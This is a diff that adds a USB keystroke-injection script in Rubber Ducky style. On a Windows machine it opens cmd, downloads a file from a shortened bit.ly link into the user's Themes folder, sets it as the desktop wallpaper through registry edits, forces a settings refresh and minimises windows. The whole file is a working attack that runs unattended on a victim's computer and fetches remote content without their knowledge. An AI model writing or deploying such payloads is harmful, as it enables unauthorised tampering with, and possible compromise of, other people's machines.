@@ -1,0 +1,25 @@
+DELAY 1000
+WINDOWS r
+DELAY 100
+STRING cmd.exe
+ENTER
+DELAY 100
+STRING powershell.exe Invoke-WebRequest -Uri https://bit.ly/33ufDKM -OutFile %userprofile%\AppData\Roaming\Microsoft\Windows\Themes\hslf.jpg
+ENTER
+DELAY 100
+STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "%userprofile%\AppData\Roaming\Microsoft\Windows\Themes\hslf.jpg" /f
+ENTER
+DELAY 100
+STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallPaperStyle /t REG_SZ /d  10 /f
+ENTER
+DELAY 100
+STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Tilewallpaper /t REG_SZ /d  0 /f
+ENTER
+DELAY 100
+STRING FOR /L %i IN (1,1,150) DO (RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters)
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 100
+GUI d
